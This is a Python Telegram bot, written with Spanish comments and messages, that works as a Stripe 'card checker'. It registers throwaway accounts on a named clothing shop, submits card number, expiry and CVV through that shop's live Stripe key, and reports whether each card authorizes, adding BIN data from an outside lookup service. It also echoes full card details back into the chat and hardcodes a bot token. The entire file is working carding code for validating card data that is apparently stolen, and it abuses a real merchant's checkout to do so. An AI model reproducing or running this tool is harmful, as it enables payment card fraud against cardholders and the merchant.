from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import requests
import re
import random
import string
import logging

# ============ CONFIGURACIÓN ============
TOKEN = "8734649482:AAHVquZreezwz_PywZAdcCNKwEHlM6Sqtec"  # Reemplaza con tu token de @BotFather

# Configuración de logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ FUNCIONES DE STRIPE ============

def get_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    })
    return session

def create_stripe_payment_method(session, cc, mm, yy, cvv, email):
    stripe_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.dastaar.clothing',
        'Referer': 'https://www.dastaar.clothing/',
        'Accept': 'application/json',
    }
    
    stripe_data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][country]': 'GB',
        'billing_details[email]': email,
        'key': 'pk_live_51J5VJqJUS8a0f77QZRGgjVtzj3NQo2p6rR0uZED6uNM0CYUkjF7kzPNpC0JtBBXGUp85ywCyL1ZUyvYwG5n5SdGP00KFhl4XmO',
        '_stripe_account': 'acct_1J5VJqJUS8a0f77Q',
        'payment_user_agent': 'stripe.js/af71287371; stripe-js-v3/af71287371',
        'referrer': 'https://www.dastaar.clothing'
    }
    
    response = session.post(
        'https://api.stripe.com/v1/payment_methods',
        data=stripe_data,
        headers=stripe_headers
    )
    return response

def auth_check(session, payment_method_id, nonce):
    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    response = session.post(
        'https://www.dastaar.clothing/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
        data=setup_data,
        headers={'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://www.dastaar.clothing'}
    )
    return response.json()

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

def check_card_stripe(cc, mm, yy, cvv):
    """Verificación de tarjeta (Auth)"""
    session = get_session()
    
    if len(yy) == 4:
        yy = yy[-2:]

    try:
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        
        # Crear cuenta
        login_page = session.get('https://www.dastaar.clothing/my-account/', timeout=10)
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page.text)
        
        if nonce_match:
            register_data = {
                'email': random_email,
                'password': 'Password123!',
                'woocommerce-register-nonce': nonce_match.group(1),
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }
            session.post('https://www.dastaar.clothing/my-account/', data=register_data, timeout=10)
        
        # Crear método de pago
        stripe_response = create_stripe_payment_method(session, cc, mm, yy, cvv, random_email)
        
        if stripe_response.status_code != 200:
            error = stripe_response.json().get('error', {})
            return {
                "status": "Declined",
                "response": error.get('message', 'Card declined'),
                "decline_type": "card_decline",
                "bin_info": get_bin_info(cc[:6])
            }
        
        payment_method_id = stripe_response.json().get('id')
        
        # Obtener nonce
        payment_page = session.get('https://www.dastaar.clothing/my-account/payment-methods/', timeout=10)
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page.text)
        
        if not nonce_match:
            return {
                "status": "Declined",
                "response": "Failed to get nonce",
                "decline_type": "process_error",
                "bin_info": get_bin_info(cc[:6])
            }
        
        # Auth check
        result = auth_check(session, payment_method_id, nonce_match.group(1))
        
        if result.get('success') or result.get('status') == 'succeeded':
            return {
                "status": "Approved",
                "response": "Auth successful",
                "decline_type": "none",
                "bin_info": get_bin_info(cc[:6])
            }
        else:
            return {
                "status": "Declined",
                "response": result.get('error', {}).get('message', 'Auth failed'),
                "decline_type": "card_decline",
                "bin_info": get_bin_info(cc[:6])
            }
                
    except Exception as e:
        return {
            "status": "Declined",
            "response": f"Error: {str(e)}",
            "decline_type": "process_error",
            "bin_info": get_bin_info(cc[:6])
        }

# ============ COMANDOS DEL BOT ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start"""
    welcome_text = """
👋 *Bienvenido al Stripe Checker Bot*

*Comandos disponibles:*

🔍 `/chk 4548812049400004|12|25|123` 
   → Verificación de tarjeta (Auth)

📊 `/bin 454881`
   → Información del BIN

⚙️ `/help`
   → Mostrar ayuda

*Formato:* CC|MM|YY|CVV
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help"""
    help_text = """
*Guía de uso:*

1️⃣ *Verificar tarjeta:*
   `/chk 4548812049400004|12|25|123`

2️⃣ *Información BIN:*
   `/bin 454881`

*Formato:* `CC|MM|YY|CVV`

⚠️ *Nota:* Este bot solo verifica la validez de la tarjeta (Auth), no realiza cargos.
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /chk - Verificación de tarjeta"""
    if not context.args:
        await update.message.reply_text(
            "❌ *Error:* Proporciona los datos de la tarjeta\n\n"
            "Uso: `/chk 4548812049400004|12|25|123`",
            parse_mode='Markdown'
        )
        return
    
    card_input = context.args[0]
    
    # Validar formato
    match = re.match(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_input)
    if not match:
        await update.message.reply_text(
            "❌ *Formato inválido*\n\n"
            "Usa: `CC|MM|YY|CVV`\n"
            "Ejemplo: `4548812049400004|12|25|123`",
            parse_mode='Markdown'
        )
        return
    
    cc, mm, yy, cvv = match.groups()
    
    # Mensaje de procesando
    processing_msg = await update.message.reply_text(
        f"⏳ *Verificando...*\n\n"
        f"💳 Card: `{cc[:6]}******{cc[-4:]}`\n"
        f"📅 Exp: `{mm}/{yy}`",
        parse_mode='Markdown'
    )
    
    # Realizar check
    result = check_card_stripe(cc, mm, yy, cvv)
    bin_info = result.get('bin_info', {})
    
    # Formatear respuesta
    if result['status'] == 'Approved':
        status_emoji = "✅"
        status_text = "APPROVED"
    else:
        status_emoji = "❌"
        status_text = "DECLINED"
    
    response_text = f"""
{status_emoji} *{status_text}*

💳 *Card:* `{cc}`
📅 *Expiry:* `{mm}/{yy}`
🔒 *CVV:* `{cvv}`

🏦 *BIN Info:*
├ Brand: `{bin_info.get('brand', 'N/A')}`
├ Type: `{bin_info.get('type', 'N/A')}`
├ Level: `{bin_info.get('level', 'N/A')}`
├ Bank: `{bin_info.get('bank', 'N/A')}`
└ Country: `{bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}`

📝 *Response:* `{result['response']}`
🔍 *Mode:* `Auth Only`
    """
    
    await processing_msg.edit_text(response_text, parse_mode='Markdown')

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /bin - Información del BIN"""
    if not context.args:
        await update.message.reply_text("Uso: `/bin 454881`", parse_mode='Markdown')
        return
    
    bin_number = context.args[0][:6]
    bin_info = get_bin_info(bin_number)
    
    if not bin_info:
        await update.message.reply_text(f"❌ No se encontró información para el BIN `{bin_number}`", parse_mode='Markdown')
        return
    
    response_text = f"""
🏦 *BIN Information*

🔢 *BIN:* `{bin_number}`
🏷️ *Brand:* `{bin_info.get('brand', 'N/A')}`
💳 *Type:* `{bin_info.get('type', 'N/A')}`
⭐ *Level:* `{bin_info.get('level', 'N/A')}`
🏛️ *Bank:* `{bin_info.get('bank', 'N/A')}`
🌍 *Country:* `{bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}`
    """
    
    await update.message.reply_text(response_text, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manejo de errores"""
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text("❌ Ocurrió un error. Intenta de nuevo.")

# ============ MAIN ============

def main():
    # Crear aplicación
    application = Application.builder().token(TOKEN).build()
    
    # Agregar handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("bin", bin_command))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    # Iniciar bot
    print("🤖 Bot iniciado. Presiona Ctrl+C para detener.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()